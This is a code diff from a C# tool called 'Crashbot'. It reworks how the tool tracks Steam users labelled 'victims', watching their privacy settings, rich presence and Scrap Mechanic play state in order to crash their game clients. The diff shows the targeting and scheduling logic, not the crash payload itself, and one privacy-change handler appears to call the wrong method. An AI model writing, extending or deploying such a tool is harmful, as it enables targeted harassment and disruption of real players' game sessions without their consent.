@@ -45,7 +45,7 @@ namespace Crashbot
         }
 
         private static readonly ConcurrentBag<Task<SteamInterface>> steamInterfaceThreads = [];
-        private readonly ConcurrentDictionary<CSteamID, (Victim Victim, CancellationTokenSource Interupt)> SteamUsers = [];
+        private readonly ConcurrentDictionary<CSteamID, Victim> SteamUsers = [];
 
         /// <summary>
         /// Creates a new steam interface in a detached thread.
@@ -80,7 +80,7 @@ namespace Crashbot
         /// <returns></returns>
         public bool AddNewVictim(Victim victim)
         {
-            bool res = this.SteamUsers.TryAdd(victim.SteamId, (victim, new()));
+            bool res = this.SteamUsers.TryAdd(victim.SteamId, victim);
             this.CrashVictimWhenReady(victim);
             return res;
         }
@@ -92,10 +92,7 @@ namespace Crashbot
         public void RemoveVictim(Victim v)
         {
             if (this.SteamUsers.TryRemove(v.SteamId, out var SteamUser))
-            {
-                SteamUser.Interupt.Cancel();
-                SteamUser.Interupt.Token.WaitHandle.WaitOne(1000);
-            }
+                SteamUser.Interupt.Interupt(1000);
         }
 
         /// <summary>
@@ -119,9 +116,8 @@ namespace Crashbot
 
         internal void CrashVictimWhenReady(Victim v)
         {
-            if (this.SteamUsers.TryGetValue(v.SteamId, out var SteamUser))
+            if (this.SteamUsers.TryGetValue(v.SteamId, out var victim))
             {
-                Victim victim = SteamUser.Victim;
                 AutoResetEvent Step = new(false);
 
                 void onSettingsLoaded(PrivacyState _)
@@ -139,41 +135,63 @@ namespace Crashbot
 
                 Logger.WriteLine($"Now watching {name} ({v.SteamId})...", Verbosity.Normal);
 
-                if (victim.PrivacySettings == PrivacyState.Private)
+                if (victim.PrivacySettings == PrivacyState.Public)
                 {
-                    // Direct connection, ocasionaly check if the profile is public
+                    this.CrashPublicClient(victim);
                     return;
                 }
 
-                bool previousState = !victim.IsPlayingScrapMechanic;
-                // wait for RP and fast track
-                void onGameChange(bool isPlaying)
-                {
-                    SteamUser.Interupt.Cancel();
-                    SteamUser.Interupt.Token.WaitHandle.WaitOne(1000);
-                    SteamUser.Interupt.Dispose();
-
-                    if (isPlaying)
-                    {
-                        SteamUser.Interupt = new();
-                        this.CrashClientAsync(victim, SteamUser.Interupt);
-                    }
-                };
-
-                victim.GetRichPresence += (_, _) => this.GetVictimRichPresence(victim);
-                victim.StartCollectRichPresence();
-
-                victim.GameStateChanged += onGameChange;
-                victim.FasterTracking(new CancellationTokenSource().Token);
-
-                onGameChange(victim.IsPlayingScrapMechanic);
+                this.CrashPrivateClient(victim);
             }
         }
 
-        private void CrashClientAsync(Victim mega_victim, CancellationTokenSource interuptSource)
+        private void CrashPrivateClient(Victim victim)
+        {
+            // Direct connection, ocasionaly check if the profile is public
+            this.CrashClientAsync(victim, victim.Interupt);
+
+            victim.PrivacySettingsChanged += _ =>
+            {
+                if (victim.PrivacySettings == PrivacyState.Public)
+                {
+                    victim.Interupt.Interupt(1000);
+                    this.CrashPublicClient(victim);
+                }
+            };
+        }
+
+        private void CrashPublicClient(Victim victim)
+        {
+            bool previousState = !victim.IsPlayingScrapMechanic;
+            // wait for RP and fast track
+            void onGameChange(bool isPlaying)
+            {
+                victim.Interupt.Reset();
+                if (isPlaying) this.CrashClientAsync(victim, victim.Interupt);
+            };
+
+            victim.GetRichPresence += (_, _) => this.GetVictimRichPresence(victim);
+            victim.StartCollectRichPresence();
+
+            victim.GameStateChanged += onGameChange;
+            victim.FasterTracking(new CancellationTokenSource().Token);
+
+            victim.PrivacySettingsChanged += _ =>
+            {
+                if (victim.PrivacySettings != PrivacyState.Public)
+                {
+                    victim.Interupt.Interupt(1000);
+                    this.CrashPublicClient(victim);
+                }
+            };
+
+            onGameChange(victim.IsPlayingScrapMechanic);
+        }
+
+        private void CrashClientAsync(Victim mega_victim, InteruptHandler interuptSource)
             => Task.Run(() => this.CrashClient(mega_victim, interuptSource));
 
-        private void CrashClient(Victim mega_victim, CancellationTokenSource interuptSource)
+        private void CrashClient(Victim mega_victim, InteruptHandler interuptSource)
         {
             if (!mega_victim.IsCrashing)
             {
@@ -189,7 +207,7 @@ namespace Crashbot
                 if (cx is null || ix is null)
                 {
                     mega_victim.IsCrashing = false;
-                    Logger.WriteLine($"Exiting early, likely due to token cancelation: {interuptSource.IsCancellationRequested}", Verbosity.Debug);
+                    Logger.WriteLine($"Exiting early, likely due to token cancelation: {interuptSource.WasInterupted}", Verbosity.Debug);
                     return;
                 }
 
@@ -242,9 +260,8 @@ namespace Crashbot
         {
             Callback<FriendRichPresenceUpdate_t>.Create(result =>
             {
-                if (this.SteamUsers.TryGetValue(result.m_steamIDFriend, out var SteamUser))
+                if (this.SteamUsers.TryGetValue(result.m_steamIDFriend, out var victim))
                 {
-                    Victim victim = SteamUser.Victim;
                     var currentRP = LoadUserRP(victim.SteamId);
                     victim.OnRichPresenceUpdate(currentRP);
                 }
